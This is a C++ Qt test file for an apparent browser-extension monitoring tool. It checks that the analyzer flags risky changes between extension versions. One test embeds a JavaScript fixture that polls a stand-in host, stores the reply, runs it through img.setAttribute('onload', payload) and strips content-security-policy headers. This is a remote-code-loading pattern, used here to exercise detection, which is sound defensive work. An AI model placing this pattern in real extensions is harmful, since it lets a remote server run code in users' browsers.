#include <QTemporaryDir>
#include <QtTest>

#include "core/analyzer.h"
#include "core/blobstore.h"
#include "core/database.h"
#include "core/jsanalysis.h"
#include "core/prettify.h"
#include "core/rules.h"
#include "core/scanner.h"
#include "core/signature.h"
#include "core/textdiff.h"
#include "testutil.h"

using namespace extwatch;

namespace {

bool hasRule(const QList<Finding>& findings, const char* rule) {
    for (const Finding& f : findings) {
        if (f.rule == QLatin1StringView(rule)) {
            return true;
        }
    }
    return false;
}

Signature fixtureSignature(const QString& version) {
    const QString dir = testutil::fixtureExtensionDir(version);
    return buildSignature(readManifest(dir), loadSourcesFromDir(dir), testutil::fixtureExtensionId());
}

}  // namespace

class TestAnalysis : public QObject {
    Q_OBJECT
private slots:
    void prettifierIsDeterministicAndIdempotent() {
        const QByteArray minified = "const a=1,b=[1,2,3];function f(x){if(x>1){return x*2}else return 0}"
                                    "const o={k:1,long:function(){return 'v'},arr:[1,2]};f(a);// done\nlet t=`x${a}y`;";
        const QString once = prettifyJavaScript(minified);
        QVERIFY(once.contains(QStringLiteral("function f(x) {")));
        QVERIFY(once.count(u'\n') > 5);
        const QString twice = prettifyJavaScript(once.toUtf8());
        QCOMPARE(twice, once);
        QVERIFY(once.contains(QStringLiteral("`x${a}y`")));  // templates untouched
        QVERIFY(once.contains(QStringLiteral("// done")));
    }

    void prettifierSurvivesBrokenInput() {
        const QString out = prettifyJavaScript("function (( {{ oops");
        QVERIFY(!out.isEmpty());
        QCOMPARE(prettifyJavaScript(QByteArray()), QString());
    }

    void extractsDomainsSinksTimersAndApis() {
        // Written with single quotes only: moc cannot scan raw string literals.
        const QByteArray src =
            "const URL_A = 'https://cdn-updates.example.invalid/cfg';\n"
            "async function poll() {\n"
            "  const r = await fetch(URL_A + '?l=' + navigator.language);\n"
            "  const t = await r.text();\n"
            "  chrome.storage.local.set({ payload: t });\n"
            "}\n"
            "setInterval(poll, 5 * 60 * 1000);\n"
            "chrome.storage.local.get('payload', ({ payload }) => {\n"
            "  const img = document.createElement('img');\n"
            "  img.setAttribute('onload', payload);\n"
            "});\n"
            "eval('1+1');\n"
            "const fn = new Function('return 1');\n"
            "document.addEventListener('keydown', () => {});\n"
            "chrome.declarativeNetRequest.updateDynamicRules({ addRules: [{ action: { responseHeaders: [{ header: 'content-security-policy', operation: 'remove' }] } }] });\n"
            "const ws = new WebSocket('wss://relay.example.invalid/socket');\n";
        const CodeFacts facts = analyzeJavaScript(QStringLiteral("sw.js"), prettifyJavaScript(src).toUtf8());
        QVERIFY(!facts.parseError);
        QStringList hosts;
        for (const DomainRef& d : facts.domains) hosts.append(d.host);
        QVERIFY(hosts.contains(QStringLiteral("cdn-updates.example.invalid")));
        QVERIFY(hosts.contains(QStringLiteral("relay.example.invalid")));
        QVERIFY(facts.chromeApis.contains(QStringLiteral("chrome.storage.local")));
        QVERIFY(facts.chromeApis.contains(QStringLiteral("chrome.declarativeNetRequest.updateDynamicRules")));
        QStringList kinds;
        for (const Sink& s : facts.sinks) kinds.append(s.kind);
        QVERIFY(kinds.contains(QStringLiteral("fetch")));
        QVERIFY(kinds.contains(QStringLiteral("attribute_exec")));
        QVERIFY(kinds.contains(QStringLiteral("eval")));
        QVERIFY(kinds.contains(QStringLiteral("new_function")));
        QVERIFY(kinds.contains(QStringLiteral("storage_get")));
        QVERIFY(kinds.contains(QStringLiteral("dnr_dynamic_rules")));
        QVERIFY(kinds.contains(QStringLiteral("websocket")));
        QCOMPARE(facts.timers.size(), 1);
        QCOMPARE(facts.timers.first().ms, 300000LL);
        QCOMPARE(facts.listeners.size(), 1);
        QCOMPARE(facts.listeners.first().event, QStringLiteral("keydown"));
        QVERIFY(facts.fingerprinting.contains(QStringLiteral("navigator.language")));
        QVERIFY(facts.securityHeaderLiterals.contains(QStringLiteral("content-security-policy")));
        for (const Sink& s : facts.sinks) {
            QVERIFY2(s.line > 0, qPrintable(s.kind));
        }
    }

    void benignUpdateProducesOnlyRoutineFindings() {
        const QList<Finding> findings = compareSignatures(fixtureSignature(QStringLiteral("1.0.0")),
                                                          fixtureSignature(QStringLiteral("1.1.0")));
        QCOMPARE(maxSeverity(findings), Severity::Info);
        QVERIFY(hasRule(findings, "manifest.version"));
        QCOMPARE(findingsSummary(findings), QStringLiteral("routine changes only"));
    }

    void maliciousUpdateIsFlaggedHigh() {
        const QList<Finding> findings = compareSignatures(fixtureSignature(QStringLiteral("1.1.0")),
                                                          fixtureSignature(QStringLiteral("1.2.0")));
        QCOMPARE(maxSeverity(findings), Severity::High);
        QVERIFY(hasRule(findings, "host.all_urls"));
        QVERIFY(hasRule(findings, "permission.sensitive"));
        QVERIFY(hasRule(findings, "remote_code.attribute_exec"));
        QVERIFY(hasRule(findings, "remote_code.storage_to_exec"));
        QVERIFY(hasRule(findings, "network.poller"));
        QVERIFY(hasRule(findings, "headers.strip_security"));
        QVERIFY(hasRule(findings, "content_scripts.broadened"));
        QVERIFY(hasRule(findings, "fingerprinting"));
        // Findings carry locations in the prettified content script / worker.
        bool located = false;
        for (const Finding& f : findings) {
            if (f.rule == QStringLiteral("remote_code.attribute_exec")) {
                QCOMPARE(f.file, QStringLiteral("content.js"));
                QVERIFY(f.line > 0);
                located = true;
            }
        }
        QVERIFY(located);
        const QString summary = findingsSummary(findings);
        QVERIFY2(summary.contains(QStringLiteral("<all_urls>")), qPrintable(summary));
        QVERIFY2(summary.contains(QStringLiteral("cdn-updates.example.invalid")), qPrintable(summary));
        // Sorted by severity, high first.
        QCOMPARE(findings.first().severity, Severity::High);
    }

    void baselineProfileListsCapabilities() {
        const QList<Finding> findings = compareSignatures(Signature(), fixtureSignature(QStringLiteral("1.0.0")));
        QVERIFY(!findings.isEmpty());
        QVERIFY(!hasRule(findings, "manifest.version"));  // no "changed" findings for a baseline
        QCOMPARE(maxSeverity(findings), Severity::Low);   // benign extension: nothing above low
    }

    void signatureRoundTripsThroughJson() {
        const Signature sig = fixtureSignature(QStringLiteral("1.2.0"));
        const Signature back = Signature::fromJson(sig.toJson());
        QCOMPARE(back.version, sig.version);
        QCOMPARE(back.domainHosts(), sig.domainHosts());
        QCOMPARE(back.sinks.size(), sig.sinks.size());
        QCOMPARE(back.timers.size(), sig.timers.size());
        QCOMPARE(back.headerMods.size(), sig.headerMods.size());
        QCOMPARE(back.manifest.hostPermissions, sig.manifest.hostPermissions);
        QCOMPARE(back.manifest.name, QStringLiteral("Screenshot Tool"));
        QCOMPARE(back.contentScriptFiles, sig.contentScriptFiles);
        // Diffing the restored signature gives the same findings as the live one.
        const QList<Finding> a = compareSignatures(Signature(), sig);
        const QList<Finding> b = compareSignatures(Signature(), back);
        QCOMPARE(a.size(), b.size());
    }

    void lineDiffAndHunks() {
        const QStringList a = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j"};
        const QStringList b = {"a", "b", "c", "X", "e", "f", "g", "h", "i", "j", "k"};
        const LineDiff d = diffLines(a, b);
        QCOMPARE(d.added, 2);
        QCOMPARE(d.removed, 1);
        QCOMPARE(d.common, 9);
        const QList<Hunk> hunks = hunksFromDiff(d, 2);
        QVERIFY(hunks.size() >= 1);
        const QString unified = unifiedDiff(QStringLiteral("old"), QStringLiteral("new"), hunks);
        QVERIFY(unified.contains(QStringLiteral("-d\n+X\n")));
        QVERIFY(unified.contains(QStringLiteral("+k\n")));
        QVERIFY(diffLines(a, b, 5).truncated);
    }

    void scanAnalyzesEventsAndRendersReport() {
        QTemporaryDir tmp;
        const QString userData = tmp.path() + QStringLiteral("/User Data");
        const QString dataDir = tmp.path() + QStringLiteral("/data");
        const QString profilePath =
            testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.1.0"));
        ScanOptions opts;
        opts.dataDir = dataDir;
        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
        const ScanResult first = runScan(opts);
        QCOMPARE(first.events.size(), 1);
        QVERIFY(first.events.first().eventRowId.has_value());

        testutil::simulateUpdate(profilePath, QStringLiteral("1.2.0"));
        const ScanResult updated = runScan(opts);
        QCOMPARE(updated.events.size(), 1);
        const ScanEvent& ev = updated.events.first();
        QCOMPARE(ev.kind, QStringLiteral("updated"));
        QCOMPARE(ev.maxSeverity, QStringLiteral("high"));
        QVERIFY(!ev.findingsSummary.isEmpty());
        QVERIFY2(ev.findingsSummary.contains(QStringLiteral("<all_urls>")), qPrintable(ev.findingsSummary));

        Database db;
        QVERIFY(db.open(databasePath(dataDir)));
        BlobStore blobs(dataDir);
        const std::optional<ChangeReport> report = buildChangeReport(db, blobs, *ev.eventRowId);
        QVERIFY(report.has_value());
        QCOMPARE(report->to.version, QStringLiteral("1.2.0"));
        QVERIFY(report->from.has_value());
        QCOMPARE(maxSeverity(report->findings), Severity::High);
        bool sawModifiedContent = false;
        for (const FileChange& c : report->files) {
            if (c.path == QStringLiteral("content.js")) {
                QCOMPARE(c.status, FileChange::Status::Modified);
                sawModifiedContent = true;
            }
            if (c.path == QStringLiteral("rules.json")) {
                QCOMPARE(c.status, FileChange::Status::Added);
            }
        }
        QVERIFY(sawModifiedContent);
        bool addedAllUrls = false;
        for (const QString& line : report->manifestDiff.split(u'\n')) {
            if (line.startsWith(u'+') && line.contains(QStringLiteral("\"<all_urls>\""))) {
                addedAllUrls = true;
            }
        }
        QVERIFY2(addedAllUrls, qPrintable(report->manifestDiff));

        const QString html = renderHtmlReport(db, blobs, *report);
        QVERIFY(html.startsWith(QStringLiteral("<!doctype html>")));
        QVERIFY(html.contains(QStringLiteral("Screenshot Tool")));
        QVERIFY(html.contains(QStringLiteral("Gains access to every website")));
        QVERIFY(html.contains(QStringLiteral("setAttribute")));

        const std::optional<QString> text = fileDisplayText(db, blobs, report->to.id, QStringLiteral("content.js"));
        QVERIFY(text.has_value());
        QVERIFY(text->contains(QStringLiteral("setAttribute('onload', payload)")));
    }
};

QTEST_GUILESS_MAIN(TestAnalysis)
#include "test_analysis.moc"
